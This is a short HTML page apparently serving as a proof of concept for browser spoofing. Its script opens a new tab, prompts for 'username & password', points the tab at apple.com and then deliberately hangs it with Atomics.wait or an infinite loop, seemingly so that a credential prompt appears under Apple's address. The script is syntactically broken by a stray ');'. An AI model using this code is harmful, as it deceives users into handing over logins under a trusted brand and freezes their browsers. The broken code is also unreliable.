<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, user-scalable=yes"
    />
    <title>testeraza</title>
  </head>
  <body>
    <button
      id="startBtn"
      style="
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        padding: 15px 30px;
        font-size: 18px;
        background: #007aff;
        color: #fff;
        border: none;
        border-radius: 10px;
        cursor: pointer;
        z-index: 10000;
      "
    >
      CLICK HERE
    </button>

    <script>
      document.getElementById("startBtn").onclick = function () {
        this.remove();
        const newTab = window.open("about:blank", "_blank");
        if (newTab) {
          prompt("username & password")
      );
          newTab.document.close();

          setTimeout(() => {
            newTab.location.href = "https://apple.com";
          }, 1);

          setTimeout(() => {
            try {
              newTab.stop();
            } catch (e) {}
            try {
              const sab = new SharedArrayBuffer(4);
              const view = new Int32Array(sab);
              Atomics.wait(view, 0, 0, 9999999);
            } catch (e) {
              while (true) {}
            }
          }, 600);
        }
      };
    </script>
  </body>
</html>
